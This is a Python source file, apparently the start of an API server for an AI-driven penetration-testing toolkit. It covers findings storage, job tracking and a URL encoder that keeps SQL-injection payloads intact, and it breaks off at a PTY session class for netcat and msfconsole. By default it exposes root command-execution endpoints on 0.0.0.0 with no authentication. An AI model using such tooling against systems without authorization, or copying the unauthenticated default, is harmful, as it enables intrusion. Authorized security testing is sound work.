#!/usr/bin/env python3
"""
Adara Linux Tools API Server — Advanced Edition
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Features:
  • FastAPI + uvicorn (replaces Flask)
  • Fully async — runs parallel commands via asyncio.gather
  • PTY-based interactive sessions: netcat listener, msfconsole, bash shells
  • asyncssh for proper SSH session management (send/receive commands)
  • SQLite findings database with target profiles
  • Structured JSON responses with rich metadata

Run: python3 Adara_server.py [--port 5000] [--host 0.0.0.0] [--debug]
"""

import argparse
import asyncio
import fcntl
import json
import os
import pty
import re
import sqlite3
import sys
import time
import uuid
import xml.etree.ElementTree as ET
from contextlib import asynccontextmanager
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

import aiosqlite
import asyncssh
import orjson
import shutil
import signal
import subprocess
import uvicorn
from urllib.parse import urlparse

# BUG-004 FIX: Use possessive quantifier emulation via atomic group pattern
# to prevent catastrophic backtracking on large MSF output.
_ANSI_RE = re.compile(
    r'\x1b(?:'
    r'\[[0-?]*[ -/]*[@-~]'   # CSI sequences  e.g. \x1b[1;34m  \x1b[?2004h
    r'|][^\x07\x1b]*(?:\x07|\x1b\\)'  # OSC sequences (simplified, no nested ESC)
    r'|[^\[\]]'               # ESC + single char e.g. \x1bM \x1b= \x1b>
    r')'
)
_STRIP_ANSI_FAST = re.compile(r'\x1b\[[0-9;]*[a-zA-Z]')  # precompiled fast strip for large outputs

def _strip_ansi(text: str) -> str:
    """Remove all ANSI/VT100 escape codes and normalize CR/CRLF.
    BUG-004 FIX: Bail out on large inputs to prevent regex hang."""
    if len(text) > 500_000:
        # For very large output, use a simpler/faster strip
        text = _STRIP_ANSI_FAST.sub('', text)
        text = text.replace('\r\n', '\n').replace('\r', '\n')
        return text
    text = _ANSI_RE.sub('', text)
    text = text.replace('\r\n', '\n').replace('\r', '\n')
    return text


_REDACT_RE = re.compile(
    r'(?<![A-Za-z0-9])(?P<flag>(?:--password|--pass|--pwd|--userpass|password|passwd|pwd|'
    r'Authorization:\s*Bearer|Bearer|Set-Cookie|sshd_pass|msf_password|mysql\s+-p|-p)\s*)'
    r'(?:=|\s)?(?P<val>"[^"]*"|\'[^\']*\'|"?\S+)',
    re.IGNORECASE,
)
# '22', '22,80', '1-1000' — nmap/nc/ssh/curl -p flags carry PORTS, not secrets
_PORTISH_RE = re.compile(r'"?[\d,\-:]+"?$')

def _redact(text: str) -> str:
    """Scrub credentials from log lines (hydra -p toor, Authorization: Bearer
    ..., sshpass -p ...). Commands embed passwords routinely — logging them
    raw leaks secrets into any captured log/SIEM.
    FIX: '\\S+?' non-greedy only masked the FIRST char of a token
    ('-p toor' → '-p ***oor'); greedy '\\S+' consumes the whole token."""
    try:
        def _sub(m):
            flag, val = m.group("flag"), m.group("val")
            # -p is also the port flag (nmap -p 22, ssh -p 2222) — keep
            # numeric/port-list values intact; only credentials get masked.
            if flag.lower() in ("-p", "-p ") and _PORTISH_RE.match(val):
                return flag + val
            return flag + "***"
        return _REDACT_RE.sub(_sub, text)
    except Exception:
        return text


def _encode_url_safe(url: str) -> str:
    """Percent-encode unsafe chars in a URL's path/query while preserving
    scheme/host/port and already-encoded %xx sequences.

    Used by curl_request when encode_url=True. Leaves existing %27 (single
    quote) etc. intact so SQLi payloads that were already encoded still work.
    """
    from urllib.parse import urlsplit, urlunsplit, quote
    if not url:
        return url
    try:
        parts = urlsplit(url)
    except ValueError:
        return url
    # 'safe' keeps URL-structural chars and the % so existing escapes survive
    # NOTE: '#' deliberately NOT safe — urlsplit already stripped it into
    # fragment, where it would otherwise be silently dropped from the request
    safe = "/?&=.%:-+_~;@(),[]!*'"
    enc_path = quote(parts.path, safe=safe) if parts.path else parts.path
    enc_query = quote(parts.query, safe=safe) if parts.query else parts.query
    if parts.fragment:
        # FIX: a literal '#' in a payload (e.g. MySQL inline comments in SQLi)
        # is parsed as a URL fragment and dropped — fold it back into the
        # request as %23 so the server actually receives the comment.
        frag_enc = "%23" + quote(parts.fragment, safe=safe)
        if enc_query:
            enc_query += frag_enc
        else:
            enc_path += frag_enc
    return urlunsplit((parts.scheme, parts.netloc, enc_path, enc_query, ""))


from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, Response
from loguru import logger
from pydantic import BaseModel

# ─────────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────────
API_PORT    = int(os.environ.get("API_PORT", 5000))
API_HOST    = os.environ.get("API_HOST", "0.0.0.0")
CMD_TIMEOUT = int(os.environ.get("CMD_TIMEOUT", 3600))
# FIX (M3): every scan tool that does NOT finish within AUTO_BG_GRACE
# seconds gets auto-backgrounded (same JobTracker backend as background=True).
# Tool endpoints used to block on run_command() for up to 3600s, which the
# MCP client cancels at ~300s with the -32001 'Request timed out' — even
# though the scan was still running fine. Now nothing ever blocks longer than
# this budget inside an MCP call. Raise via env for slow/very long scans.
AUTO_BG_GRACE = float(os.environ.get("AUTO_BG_GRACE", "30"))
DB_PATH     = os.environ.get("DB_PATH", "/tmp/Adara_mcp_findings.db")

# Optional bearer-token auth: set ADARA_TOKEN to require
# 'Authorization: Bearer <token>' (or X-API-Key header) on every /api/* route.
# Empty token = no auth (lab mode). The API exposes root-RCE endpoints
# (/api/command, /api/scan/start, ssh_upload), so ALWAYS set a token when
# binding beyond 127.0.0.1.
API_TOKEN   = os.environ.get("ADARA_TOKEN", "")

# ─────────────────────────────────────────────
# Optional: CVE enrichment + PoC repo lookup
try:
    from cve_enrichment import lookup_poc_all, lookup_cve_all
    _HAS_CVE_ENRICHMENT = True
except ImportError:
    _HAS_CVE_ENRICHMENT = False
    logger.warning("cve_enrichment.py not found — PoC/CVE lookup endpoints disabled")

# Loguru — pretty, structured logs
# ─────────────────────────────────────────────
logger.remove()
logger.add(
    sys.stderr,
    format="<green>{time:HH:mm:ss}</green> | <level>{level: <8}</level> | <cyan>{message}</cyan>",
    level="INFO",
    colorize=True,
)

# ─────────────────────────────────────────────
# SQLite Findings DB — v2 with dedup, status, provenance, JSON targets
# ─────────────────────────────────────────────
import hashlib

class FindingsDB:
    def __init__(self, path: str = DB_PATH):
        self.path = path
        self._conn_holder: Optional[aiosqlite.Connection] = None
        self._conn_lock = asyncio.Lock()
        self._init_db()

    async def _conn(self) -> aiosqlite.Connection:
        """Lazy shared async connection (aiosqlite runs it on a dedicated
        background thread — zero event-loop blocking, requests serialized
        safely by its internal queue). The lock prevents the check-then-act
        race where two concurrent requests both create a connection (one
        leaked, two writers)."""
        async with self._conn_lock:
            if self._conn_holder is None:
                self._conn_holder = await aiosqlite.connect(self.path)
                self._conn_holder.row_factory = sqlite3.Row
        return self._conn_holder

    def _init_db(self):
        with sqlite3.connect(self.path) as conn:
            conn.executescript("""
                PRAGMA journal_mode=WAL;
                CREATE TABLE IF NOT EXISTS findings (
                    id           INTEGER PRIMARY KEY AUTOINCREMENT,
                    target       TEXT NOT NULL,
                    tool         TEXT NOT NULL,
                    category     TEXT DEFAULT 'info',
                    title        TEXT NOT NULL,
                    detail       TEXT,
                    summary      TEXT,
                    severity     TEXT DEFAULT 'info',
                    raw_output   TEXT,
                    raw_len      INTEGER DEFAULT 0,
                    finding_hash TEXT UNIQUE,
                    status       TEXT DEFAULT 'new',
                    scan_command TEXT,
                    created_at   TEXT DEFAULT (datetime('now')),
                    updated_at   TEXT DEFAULT (datetime('now'))
                );
                -- TIER-2 CONTENT STORE: chunked raw bodies. Metadata stays in
                -- `findings`; the big blob lives here (rarely fetched whole,
                -- always paged via windows). A finding with no blob rows stores
                -- everything inline in findings.raw_output (the common case).
                CREATE TABLE IF NOT EXISTS finding_blobs (
                    finding_id INTEGER NOT NULL REFERENCES findings(id) ON DELETE CASCADE,
                    chunk_idx  INTEGER NOT NULL,
                    chunk_text TEXT NOT NULL,
                    created_at TEXT DEFAULT (datetime('now')),
                    PRIMARY KEY (finding_id, chunk_idx)
                );
                CREATE TABLE IF NOT EXISTS targets (
                    id             INTEGER PRIMARY KEY AUTOINCREMENT,
                    host           TEXT UNIQUE NOT NULL,
                    os_guess       TEXT,
                    open_ports     TEXT,
                    services       TEXT,
                    cves           TEXT,
                    open_ports_json TEXT DEFAULT '[]',
                    services_json   TEXT DEFAULT '[]',
                    cves_json       TEXT DEFAULT '[]',
                    notes          TEXT,
                    updated_at     TEXT DEFAULT (datetime('now'))
                );
                CREATE TABLE IF NOT EXISTS sessions (
                    id          TEXT PRIMARY KEY,
                    type        TEXT NOT NULL,
                    target      TEXT,
                    status      TEXT DEFAULT 'active',
                    created_at  TEXT DEFAULT (datetime('now'))
                );
                CREATE TABLE IF NOT EXISTS analyses (
                    id           INTEGER PRIMARY KEY AUTOINCREMENT,
                    target       TEXT NOT NULL,
                    analysis_json TEXT,
                    delta_json   TEXT,
                    finding_count INTEGER DEFAULT 0,
                    cve_count    INTEGER DEFAULT 0,
                    created_at   TEXT DEFAULT (datetime('now'))
                );
                CREATE INDEX IF NOT EXISTS idx_findings_hash ON findings(finding_hash);
                CREATE INDEX IF NOT EXISTS idx_findings_status ON findings(status);
                CREATE INDEX IF NOT EXISTS idx_findings_target ON findings(target);
                CREATE INDEX IF NOT EXISTS idx_findings_tool ON findings(tool);
                CREATE INDEX IF NOT EXISTS idx_findings_severity ON findings(severity);
                CREATE INDEX IF NOT EXISTS idx_findings_created ON findings(created_at);
                CREATE INDEX IF NOT EXISTS idx_findings_target_created ON findings(target, created_at);
                CREATE INDEX IF NOT EXISTS idx_analyses_target ON analyses(target);
                CREATE INDEX IF NOT EXISTS idx_analyses_target_created ON analyses(target, created_at);
            """)
            self._migrate(conn)
            self._ensure_fts(conn)
        logger.info(f"Findings DB ready at {self.path}")

    def _fts_supported(self) -> bool:
        return bool(getattr(self, "_fts_ok", False))

    def _ensure_fts(self, conn=None):
        """Create the FTS5 search index if the extension is available.
        Sets self._fts_ok so callers know whether to use MATCH or LIKE."""
        def _probe(c):
            c.execute("CREATE VIRTUAL TABLE IF NOT EXISTS findings_fts USING fts5("
                      "target, tool, category, title, detail, severity, "
                      "content='', content_rowid='id')")
            return True
        try:
            if conn is not None:
                ok = _probe(conn)
            else:
                with sqlite3.connect(self.path) as c:
                    ok = _probe(c)
            self._fts_ok = ok
        except Exception:
            self._fts_ok = False
            logger.info("FTS5 not available — findings search falls back to LIKE")

    def _migrate(self, conn):
        """Add new columns to existing tables for backward compat."""
        cols = [r[1] for r in conn.execute("PRAGMA table_info(findings)").fetchall()]
        for col, default in [("finding_hash", "NULL"), ("status", "'new'"),
                      ("scan_command", "NULL"), ("updated_at", "CURRENT_TIMESTAMP"),
                      ("raw_len", "0"), ("summary", "NULL")]:
            if col not in cols:
                conn.execute(f"ALTER TABLE findings ADD COLUMN {col} TEXT DEFAULT {default}")
                logger.info(f"Migrated: added findings.{col}")
        tcols = [r[1] for r in conn.execute("PRAGMA table_info(targets)").fetchall()]
        for col in ["open_ports_json", "services_json", "cves_json"]:
            if col not in tcols:
                conn.execute(f"ALTER TABLE targets ADD COLUMN {col} TEXT DEFAULT '[]'")
                logger.info(f"Migrated: added targets.{col}")
        # Ensure analyses table exists
        conn.execute("""CREATE TABLE IF NOT EXISTS analyses (
            id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT NOT NULL,
            analysis_json TEXT, delta_json TEXT,
            finding_count INTEGER DEFAULT 0, cve_count INTEGER DEFAULT 0,
            created_at TEXT DEFAULT (datetime('now'))
        )""")
        # Background scan jobs (JobTracker) — durability across server restarts
        conn.execute("""CREATE TABLE IF NOT EXISTS jobs (
            job_id      TEXT PRIMARY KEY,
            command     TEXT,
            log_path    TEXT,
            track       TEXT DEFAULT '',
            started_at  TEXT DEFAULT (datetime('now')),
            finished_at TEXT,
            exit_code   INTEGER
        )""")
        # Request templates — reusable crafted HTTP requests for replay
        conn.execute("""CREATE TABLE IF NOT EXISTS request_templates (
            name            TEXT PRIMARY KEY,
            method          TEXT DEFAULT 'GET',
            url             TEXT,
            headers_json    TEXT DEFAULT '{}',
            data            TEXT DEFAULT '',
            additional_args TEXT DEFAULT '-sk',
            created_at      TEXT DEFAULT (datetime('now')),
            updated_at      TEXT DEFAULT (datetime('now'))
        )""")

    # ── Job persistence helpers ──
    async def save_job(self, job_id: str, command: str, log_path: str, track: str = ""):
        try:
            conn = await self._conn()
            await conn.execute(
                "INSERT OR REPLACE INTO jobs (job_id, command, log_path, track, started_at) "
                "VALUES (?,?,?,?,datetime('now'))",
                (job_id, command, log_path, track),
            )
            await conn.commit()
        except Exception as e:
            logger.warning(f"save_job error: {e}")

    async def finish_job(self, job_id: str, exit_code: int):
        try:
            conn = await self._conn()
            await conn.execute(
                "UPDATE jobs SET finished_at=datetime('now'), exit_code=? WHERE job_id=?",
                (exit_code, job_id),
            )
            await conn.commit()
        except Exception as e:
            logger.warning(f"finish_job error: {e}")

    async def get_job(self, job_id: str) -> Optional[Dict]:
        conn = await self._conn()
        cur = await conn.execute("SELECT * FROM jobs WHERE job_id=?", (job_id,))
        r = await cur.fetchone()
        return dict(r) if r else None

    async def list_jobs(self) -> List[Dict]:
        conn = await self._conn()
        cur = await conn.execute(
            "SELECT * FROM jobs ORDER BY started_at DESC LIMIT 200")
        rows = await cur.fetchall()
        return [dict(r) for r in rows]

    # ── Request template helpers ──
    async def save_template(self, name: str, method: str, url: str,
                            headers: Dict, data: str, additional_args: str):
        conn = await self._conn()
        await conn.execute(
            "INSERT INTO request_templates "
            "(name, method, url, headers_json, data, additional_args, updated_at) "
            "VALUES (?,?,?,?,?,?,datetime('now')) "
            "ON CONFLICT(name) DO UPDATE SET "
            "method=excluded.method, url=excluded.url, headers_json=excluded.headers_json, "
            "data=excluded.data, additional_args=excluded.additional_args, "
            "updated_at=datetime('now')",
            (name, method, url, json.dumps(headers), data, additional_args),
        )
        await conn.commit()

    async def get_template(self, name: str) -> Optional[Dict]:
        conn = await self._conn()
        cur = await conn.execute("SELECT * FROM request_templates WHERE name=?", (name,))
        r = await cur.fetchone()
        if not r:
            return None
        d = dict(r)
        try:
            d["headers"] = json.loads(d.pop("headers_json") or "{}")
        except (json.JSONDecodeError, TypeError):
            d["headers"] = {}
            d.pop("headers_json", None)
        return d

    async def list_templates(self) -> List[Dict]:
        conn = await self._conn()
        cur = await conn.execute(
            "SELECT name, method, url, updated_at FROM request_templates "
            "ORDER BY updated_at DESC")
        rows = await cur.fetchall()
        return [dict(r) for r in rows]

    async def delete_template(self, name: str) -> bool:
        conn = await self._conn()
        cur = await conn.execute("DELETE FROM request_templates WHERE name=?", (name,))
        await conn.commit()
        return cur.rowcount > 0

    def _make_hash(self, target: str, tool: str, title: str, detail: str = "") -> str:
        """Deterministic SHA256 dedup hash from key finding fields.
        FIX: hash the FULL detail — truncating at 200 chars silently merged
        distinct findings that shared a long identical prefix."""
        raw = f"{target}|{tool}|{title}|{detail}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    # Content tiering: bodies larger than this go to finding_blobs as chunks
    # instead of living inline in findings.raw_output. Magic because a single
    # 200KB argument/row was the exact transport failure we hit.
    INLINE_RAW_CAP = 256 * 1024          # inline up to 256KB
    BLOB_CHUNK = 64 * 1024               # 64KB content-store rows

    def _make_summary(self, text: str, detail: str = "", tool: str = "") -> str:
        """Small indexed summary (≤ ~500 words): tool + first meaningful lines.
        FIX: single-line blobs (no newlines) previously passed the whole 650KB
        body through as one 'line' — the 500-word cap did nothing (no spaces)
        and every findings row leaked ~6KB of evidence in `summary`."""
        raw = text or detail or ""
        lines = [l.strip() for l in raw.splitlines() if l.strip()]
        # Hard-cap each line so a newline-less giant blob can't balloon the
        # summary — keep just the first meaningful slice.
        lines = [l[:1000] for l in lines]
        if len(lines) == 1 and len(lines[0]) >= 1000:
            lines[0] = lines[0][:1000] + "…"
        taken = []
        for l in lines:
            taken.append(l)
            if sum(len(l2) for l2 in taken) >= 3000:
                break
        prefix = f"({tool}) " if tool else ""
        summary = (prefix + " ".join(taken))[:6000]
        words = summary.split()
        if len(words) > 500:
            words = words[:500]
        return " ".join(words)

    async def _write_blobs(self, conn, finding_id: int, text: str, chunk: int = BLOB_CHUNK):
        """Split a large body into finding_blobs rows (tier-2 content store)."""
        await conn.execute("DELETE FROM finding_blobs WHERE finding_id=?", (finding_id,))
        pieces = [text[i:i + chunk] for i in range(0, len(text), chunk)] or [""]
        await conn.executemany(
            "INSERT OR REPLACE INTO finding_blobs (finding_id, chunk_idx, chunk_text) "
            "VALUES (?,?,?)",
            [(finding_id, i, p) for i, p in enumerate(pieces)],
        )

    async def read_raw(self, finding_id: int, offset: int = 0, limit: int = 2000) -> Dict:
        """Tier-aware raw read: inline if small, else page finding_blobs.
        Returns windowed evidence without ever loading the whole 200KB blob
        into a single response — the MCP-safer way to read the middle."""
        conn = await self._conn()
        cur = await conn.execute("SELECT raw_output, raw_len, detail FROM findings WHERE id=?",
                                 (finding_id,))
        row = await cur.fetchone()
        if not row:
            raise KeyError(finding_id)
        inline, raw_len, detail = row[0] or "", row[1] or 0, row[2] or ""
        # FIX: raw_len is TEXT in migrated DBs (ALTER TABLE ... TEXT) and stored
        # as a string for legacy rows — always coerce before comparing.
        try:
            raw_len = int(raw_len)
        except (TypeError, ValueError):
            raw_len = 0
        full = inline
        if not inline:
            cur2 = await conn.execute(
                "SELECT chunk_text FROM finding_blobs WHERE finding_id=? "
                "ORDER BY chunk_idx", (finding_id,))
            chunks = [r[0] for r in await cur2.fetchall()]
            full = "".join(chunks) if chunks else detail
        if raw_len <= 0:
            raw_len = len(full)
        total = len(full)
        offset = max(offset, 0)
        limit = max(limit, 0)
        window = full[offset:offset + limit]
        return {
            "finding_id": finding_id,
            "raw_len": total,
            "offset": offset,
            "limit": limit,
            "truncated": offset + limit < total,
            "text": window,
            "inline": bool(inline),
        }

    async def search_findings(self, query: str, target: Optional[str] = None,
                              limit: int = 25) -> List[Dict]:
        """Full-text search over the small indexed fields. Uses FTS5 MATCH
        when available, otherwise LIKE over target/tool/category/title/detail."""
        query = (query or "").strip()
        if not query:
            return []
        limit = max(min(limit, 500), 1)
        conn = await self._conn()
        args: list = []
        if self._fts_supported():
            # FTS5 MATCH is strict — fall back to LIKE if it rejects the query
            try:
                q = " ".join(f'"{w}"' for w in query.split())
                sql = ("SELECT id, target, tool, category, title, detail, summary, "
                       "severity, raw_len, status, scan_command, created_at "
                       "FROM findings_fts JOIN findings ON findings_fts.rowid = findings.id "
                       "WHERE findings_fts MATCH ?")
                if target:
                    sql += " AND findings.target=?"
                    args.append(target)
                sql += " ORDER BY rank LIMIT ?"
                args += [q, limit]
                rows = await conn.execute(sql, args)
                return [dict(r) for r in await rows.fetchall()]
            except Exception:
                pass  # fall through to LIKE
        sql = ("SELECT id, target, tool, category, title, detail, summary, "
               "severity, raw_len, status, scan_command, created_at "
               "FROM findings WHERE "
               "(title LIKE ? OR detail LIKE ? OR summary LIKE ? OR target LIKE ? OR tool LIKE ?)")
        like = f"%{query}%"
        args = [like, like, like, like, like]
        if target:
            sql += " AND target=?"
            args.append(target)
        sql += " ORDER BY created_at DESC LIMIT ?"
        args.append(limit)
        rows = await conn.execute(sql, args)
        return [dict(r) for r in await rows.fetchall()]

    async def save_finding(self, target: str, tool: str, category: str,
                           title: str, detail: str = "", severity: str = "info",
                           raw_output: str = "", scan_command: str = "",
                           finding_hash: str = None) -> int:
        """Save finding with dedup. Returns id (>0 new, 0 duplicate).
        FIX: a duplicate re-run now refreshes the stored evidence (raw_output)
        instead of silently keeping the FIRST scan's stale output forever.
        TIER: bodies > INLINE_RAW_CAP are moved to finding_blobs and
        raw_output stores only a pointer ('' inline + raw_len) so a single
        findings row / list response never carries a 200KB+ blob."""
        if not finding_hash:
            finding_hash = self._make_hash(target, tool, title, detail)
        try:
            raw_len = len(raw_output or "")
            inline_raw = raw_output if raw_len <= self.INLINE_RAW_CAP else ""
            summary = self._make_summary(raw_output, detail, tool)
            conn = await self._conn()
            # Duplicate key first — the UPSERT path can't distinguish an
            # update from an insert via lastrowid, which broke the
            # "0 = duplicate" contract (re-runs came back as new findings).
            cur = await conn.execute("SELECT id FROM findings WHERE finding_hash=?", (finding_hash,))
            existing = await cur.fetchone()
            if existing:
                fid = ex = existing[0]
                await conn.execute(
                    """UPDATE findings SET
                       raw_output=?, raw_len=?, summary=?, scan_command=?,
                       severity=?, updated_at=datetime('now')
                       WHERE id=?""",
                    (inline_raw, raw_len, summary, scan_command, severity, ex))
                await conn.commit()
                if raw_len > self.INLINE_RAW_CAP:
                    await self._write_blobs(conn, ex, raw_output)
                    await conn.commit()
                await self._index_finding(conn, ex, target, tool, category, title, detail, summary)
                await conn.commit()
                return 0   # duplicate — evidence refreshed
            cur = await conn.execute(
                """INSERT INTO findings
                   (target,tool,category,title,detail,summary,severity,raw_output,raw_len,finding_hash,scan_command)
                   VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                (target, tool, category, title, detail, summary, severity,
                 inline_raw, raw_len, finding_hash, scan_command)
            )
            await conn.commit()
            fid = cur.lastrowid
            # Large bodies → tier-2 store (after the row / the hash is known)
            if raw_len > self.INLINE_RAW_CAP and fid:
                await self._write_blobs(conn, fid, raw_output)
                await conn.commit()
            await self._index_finding(conn, fid, target, tool, category, title, detail, summary)
            await conn.commit()
            return fid if fid else -1
        except Exception as e:
            logger.warning(f"save_finding error: {e}")
            return -1   # distinct from 0 (duplicate) — callers must not report 'duplicate' on a failed write

    async def _index_finding(self, conn, fid: int, target: str, tool: str,
                             category: str, title: str, detail: str, summary: str):
        """Keep the FTS5 search cache in sync with a finding row (small fields
        only — never the raw blob). No-op if FTS5 is unavailable."""
        if not self._fts_supported():
            return
        try:
            await conn.execute(
                "INSERT OR REPLACE INTO findings_fts "
                "(rowid, target, tool, category, title, detail, severity) "
                "VALUES (?,?,?,?,?,?,?)",
                (fid, target, tool, category, title, detail, ""))
        except Exception:
            self._fts_ok = False

    async def update_finding_status(self, finding_id: int, status: str) -> bool:
        """Update finding workflow status (new/confirmed/false_positive/remediated)."""
        valid = {"new", "confirmed", "false_positive", "remediated"}
        if status not in valid:
            return False
        conn = await self._conn()
        cur = await conn.execute(
            "UPDATE findings SET status=?, updated_at=datetime('now') WHERE id=?",
            (status, finding_id)
        )
        await conn.commit()
        # FIX8: was returning True even for phantom IDs — the agent was told
        # "updated" on a finding that doesn't exist
        return cur.rowcount > 0

    async def update_target(self, host: str, **kwargs):
        fields = {k: v for k, v in kwargs.items() if v is not None}
        if not fields:
            return
        # Auto-sync JSON columns when plain-text columns are updated.
        # FIX: strip trailing separators + dedupe — repeated auto-sync writes
        # previously accumulated duplicate ports and sentinel empties.
        if "open_ports" in fields and "open_ports_json" not in fields:
            try:
                seen, parts = set(), []
                for p in fields["open_ports"].split(","):
                    p = p.strip().strip(",.;")
                    if p and p not in seen:
                        seen.add(p); parts.append(p)
                fields["open_ports_json"] = json.dumps(parts)
            except Exception:
                pass
        if "services" in fields and "services_json" not in fields:
            try:
                seen, parts = set(), []
                for s in fields["services"].split(","):
                    s = s.strip().strip(",.;")
                    if s and s not in seen:
                        seen.add(s); parts.append(s)
                fields["services_json"] = json.dumps(parts)
            except Exception:
                pass
        if "cves" in fields and "cves_json" not in fields:
            try:
                seen, parts = set(), []
                for c in fields["cves"].split(","):
                    c = c.strip().upper()
                    if c and c not in seen:
                        seen.add(c); parts.append(c)
                fields["cves"] = ", ".join(parts)
                fields["cves_json"] = json.dumps(parts)
            except Exception:
                pass
        set_clause = ", ".join(f"{k}=?" for k in fields)
        values = list(fields.values()) + [host]
        conn = await self._conn()
        await conn.execute("INSERT OR IGNORE INTO targets (host) VALUES (?)", (host,))
        await conn.execute(f"UPDATE targets SET {set_clause}, updated_at=datetime('now') WHERE host=?", values)
        await conn.commit()

    async def get_target(self, host: str) -> Optional[Dict]:
        conn = await self._conn()
        cur = await conn.execute("SELECT * FROM targets WHERE host=?", (host,))
        row = await cur.fetchone()
        if not row:
            return None
        d = dict(row)
        # Parse JSON columns for structured access
        for jc in ("open_ports_json", "services_json", "cves_json"):
            try:
                d[jc] = json.loads(d.get(jc) or "[]")
            except (json.JSONDecodeError, TypeError):
                d[jc] = []
        return d

    async def get_findings(self, target: Optional[str] = None,
                           status: Optional[str] = None,
                           limit: int = 2000, offset: int = 0) -> List[Dict]:
        conn = await self._conn()
        q = "SELECT * FROM findings WHERE 1=1"
        args: list = []
        if target:
            q += " AND target=?"; args.append(target)
        if status:
            q += " AND status=?"; args.append(status)
        q += " ORDER BY created_at DESC LIMIT ? OFFSET ?"
        args += [max(min(limit, 5000), 0), max(offset, 0)]
        cur = await conn.execute(q, args)
        rows = await cur.fetchall()
        return [dict(r) for r in rows]

    async def count_findings(self, target: Optional[str] = None,
                             status: Optional[str] = None) -> int:
        conn = await self._conn()
        q = "SELECT COUNT(*) FROM findings WHERE 1=1"
        args: list = []
        if target:
            q += " AND target=?"; args.append(target)
        if status:
            q += " AND status=?"; args.append(status)
        cur = await conn.execute(q, args)
        r = await cur.fetchone()
        return r[0]

    async def counts_by_severity(self, target: Optional[str] = None,
                                 status: Optional[str] = None) -> Dict[str, int]:
        """Findings grouped by severity — lets the AI re-orient without
        fetching every row (key to not losing track on long engagements)."""
        conn = await self._conn()
        q = "SELECT severity, COUNT(*) FROM findings WHERE 1=1"
        args: list = []
        if target:
            q += " AND target=?"; args.append(target)
        if status:
            q += " AND status=?"; args.append(status)
        q += " GROUP BY severity"
        cur = await conn.execute(q, args)
        rows = await cur.fetchall()
        return {sev: n for sev, n in rows}

    async def counts_by_status(self, target: Optional[str] = None) -> Dict[str, int]:
        conn = await self._conn()
        q = "SELECT status, COUNT(*) FROM findings WHERE 1=1"
        args: list = []
        if target:
            q += " AND target=?"; args.append(target)
        q += " GROUP BY status"
        cur = await conn.execute(q, args)
        rows = await cur.fetchall()
        return {st: n for st, n in rows}

    async def counts_by_tool(self, target: Optional[str] = None) -> Dict[str, int]:
        conn = await self._conn()
        q = "SELECT tool, COUNT(*) FROM findings WHERE 1=1"
        args: list = []
        if target:
            q += " AND target=?"; args.append(target)
        q += " GROUP BY tool"
        cur = await conn.execute(q, args)
        rows = await cur.fetchall()
        return {t: n for t, n in rows}

    async def get_all_targets(self) -> List[Dict]:
        conn = await self._conn()
        cur = await conn.execute("SELECT * FROM targets ORDER BY updated_at DESC")
        rows = []
        for r in await cur.fetchall():
            d = dict(r)
            for jc in ("open_ports_json", "services_json", "cves_json"):
                try:
                    d[jc] = json.loads(d.get(jc) or "[]")
                except (json.JSONDecodeError, TypeError):
                    d[jc] = []
            rows.append(d)
        return rows

    async def save_analysis(self, target: str, analysis: Dict, delta: Dict = None) -> int:
        conn = await self._conn()
        cur = await conn.execute(
            """INSERT INTO analyses (target, analysis_json, delta_json, finding_count, cve_count)
               VALUES (?,?,?,?,?)""",
            (target, json.dumps(analysis), json.dumps(delta or {}),
             analysis.get("finding_count", 0), len(analysis.get("cves") or []))
        )
        await conn.commit()
        return cur.lastrowid

    async def get_analysis_history(self, target: str, limit: int = 10) -> List[Dict]:
        conn = await self._conn()
        cur = await conn.execute(
            "SELECT * FROM analyses WHERE target=? ORDER BY created_at DESC LIMIT ?",
            (target, min(limit, 100))
        )
        results = []
        for r in await cur.fetchall():
            d = dict(r)
            for jf in ("analysis_json", "delta_json"):
                try:
                    d[jf] = json.loads(d.get(jf) or "{}")
                except (json.JSONDecodeError, TypeError):
                    d[jf] = {}
            results.append(d)
        return results

    async def generate_report(self, target: Optional[str] = None,
                              fmt: str = "json") -> Dict:
        """Generate structured report with severity stats and finding breakdown."""
        if fmt not in ("json", "markdown", "summary"):
            return {"error": f"unsupported format: {fmt}", "success": False}
        # FIX: 2000 rows each carrying multi-MB raw_output = gigabytes of
        # JSON for one request; cap the list and strip raw_output (raw_len
        # stays, exactly like /api/findings) so the report is context-safe.
        findings = await self.get_findings(target, limit=200)
        for f in findings:
            ro = f.get("raw_output") or ""
            f["raw_len"] = len(ro)
            f["raw_output"] = ""
        targets = await self.get_all_targets() if not target else []
        tgt = await self.get_target(target) if target else None
        if tgt:
            targets = [tgt]
        # FIX: totals must reflect the WHOLE findings set, not just the
        # capped 200-row slice — otherwise a 615-row DB reports "200".
        total = await self.count_findings(target)
        counted_sev = await self.counts_by_severity(target)
        sev_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        sev_counts.update({k: v for k, v in counted_sev.items()})
        status_counts = await self.counts_by_status(target)
        tool_counts = await self.counts_by_tool(target)
        base = {
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "target_filter": target,
            "total_findings": total,
            "severity_breakdown": sev_counts,
            "status_breakdown": status_counts,
            "tool_breakdown": tool_counts,
        }
        if fmt == "summary":
            return base
        if fmt == "markdown":
            lines = [f"# Adara report — {target or 'all targets'}",
                     f"- Total findings: {total}",
                     "- Severity: " + ", ".join(f"{k}={v}" for k, v in sev_counts.items() if v),
                     "", "## Findings", ""]
            for f in findings[:100]:
                lines.append(f"- **[{str(f.get('severity', 'info')).upper()}]** {f.get('title', '')} "
                             f"({f.get('tool', '')} @ {f.get('target', '')})")
            base["markdown"] = "\n".join(lines)
            return base
        base["targets"] = targets
        base["findings"] = findings
        return base

    async def clear_target(self, host: str):
        conn = await self._conn()
        await conn.execute("DELETE FROM findings WHERE target=?", (host,))
        await conn.execute("DELETE FROM targets WHERE host=?", (host,))
        await conn.execute("DELETE FROM analyses WHERE target=?", (host,))
        await conn.commit()


# ─────────────────────────────────────────────
# PTY Session Manager
# Handles: netcat listeners, msfconsole, bash
# ─────────────────────────────────────────────
class PTYSession:
    """A persistent PTY-backed interactive process session."""

    def __init__(self, session_id: str, session_type: str, target: str = ""):
        self.session_id   = session_id
        self.session_type = session_type
        self.target       = target
